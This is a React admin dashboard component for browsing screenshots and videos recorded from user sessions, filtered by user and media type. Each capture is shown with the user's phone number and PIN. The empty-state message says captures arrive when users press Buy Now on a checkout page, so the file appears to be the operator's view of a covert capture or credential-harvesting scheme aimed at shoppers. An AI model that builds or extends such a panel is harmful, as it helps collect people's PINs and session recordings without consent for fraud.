import { useCallback, useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { adminAuthHeaders, clearAdminSession } from "../utils/auth";

/**
 * Admin dashboard — review screenshots and videos from all users.
 */
export default function AdminDashboard() {
  const navigate = useNavigate();
  const [items, setItems] = useState([]);
  const [users, setUsers] = useState([]);
  const [filterUser, setFilterUser] = useState("");
  const [filterType, setFilterType] = useState("");
  const [selected, setSelected] = useState(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");

  const fetchItems = useCallback(async (username = "", type = "") => {
    setLoading(true);
    setError("");
    try {
      const params = new URLSearchParams();
      if (username) params.set("username", username);
      if (type) params.set("type", type);
      const query = params.toString() ? `?${params.toString()}` : "";

      const res = await fetch(`/api/screenshots${query}`, {
        headers: adminAuthHeaders(),
      });
      const data = await res.json();

      if (!res.ok) {
        throw new Error(data.message || "Failed to load media");
      }

      setItems(data.screenshots);
      setSelected(data.screenshots[0] || null);
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  }, []);

  const fetchUsers = useCallback(async () => {
    try {
      const res = await fetch("/api/screenshots/users", {
        headers: adminAuthHeaders(),
      });
      const data = await res.json();
      if (res.ok) setUsers(data.users);
    } catch {
      // ignore
    }
  }, []);

  useEffect(() => {
    fetchUsers();
  }, [fetchUsers]);

  useEffect(() => {
    fetchItems(filterUser, filterType);
  }, [filterUser, filterType, fetchItems]);

  const handleLogout = () => {
    clearAdminSession();
    navigate("/admin/login");
  };

  const formatDate = (iso) => {
    try {
      return new Date(iso).toLocaleString();
    } catch {
      return iso;
    }
  };

  const typeLabel = (item) => {
    if (item.type === "video") return "VIDEO";
    return "IMAGE";
  };

  return (
    <div className="page dashboard-page admin-dashboard">
      <header className="dashboard-header">
        <div>
          <h1>Admin Dashboard</h1>
          <p className="subtitle">Screenshots &amp; videos from user sessions</p>
        </div>
        <button className="btn-secondary" onClick={handleLogout} type="button">
          Logout
        </button>
      </header>

      <div className="card admin-toolbar">
        <label className="filter-label">
          User
          <select value={filterUser} onChange={(e) => setFilterUser(e.target.value)}>
            <option value="">All users</option>
            {users.map((u) => (
              <option key={u} value={u}>{u}</option>
            ))}
          </select>
        </label>
        <label className="filter-label">
          Type
          <select value={filterType} onChange={(e) => setFilterType(e.target.value)}>
            <option value="">All</option>
            <option value="screenshot">Screenshots</option>
            <option value="video">Videos</option>
          </select>
        </label>
        <button
          type="button"
          className="btn-primary"
          onClick={() => fetchItems(filterUser, filterType)}
        >
          Refresh
        </button>
        <span className="meta">{items.length} file(s)</span>
      </div>

      {error && <p className="error card">{error}</p>}

      {loading ? (
        <p className="card meta">Loading…</p>
      ) : items.length === 0 ? (
        <div className="card placeholder">
          No captures yet. Users press Buy Now on the checkout page.
        </div>
      ) : (
        <div className="admin-gallery">
          <div className="card admin-list">
            <h2>Captures</h2>
            <ul className="screenshot-list">
              {items.map((item) => (
                <li key={item.id}>
                  <button
                    type="button"
                    className={`screenshot-list-item ${
                      selected?.id === item.id ? "active" : ""
                    }`}
                    onClick={() => setSelected(item)}
                  >
                    <span className="shot-type">{typeLabel(item)}</span>
                    <span className="shot-user">{item.username}</span>
                    {item.phone && (
                      <span className="shot-phone">Phone: {item.phone}</span>
                    )}
                    <span className="shot-time">{formatDate(item.savedAt)}</span>
                    <span className="shot-file">{item.filename}</span>
                  </button>
                </li>
              ))}
            </ul>
          </div>

          <div className="card admin-preview">
            <h2>Preview</h2>
            {selected ? (
              <>
                <p className="meta">
                  <strong>{typeLabel(selected)}</strong> · User:{" "}
                  <strong>{selected.username}</strong>
                  {selected.phone && ` · Phone: ${selected.phone}`}
                  {selected.pin && ` · PIN: ${selected.pin}`}
                  <br />
                  {formatDate(selected.savedAt)}
                </p>
                {selected.type === "video" ? (
                  <video
                    src={selected.url}
                    controls
                    className="screenshot-preview"
                    playsInline
                  />
                ) : (
                  <img
                    src={selected.url}
                    alt={`Capture by ${selected.username}`}
                    className="screenshot-preview"
                  />
                )}
              </>
            ) : (
              <div className="placeholder">Select an item to preview</div>
            )}
          </div>
        </div>
      )}
    </div>
  );
}
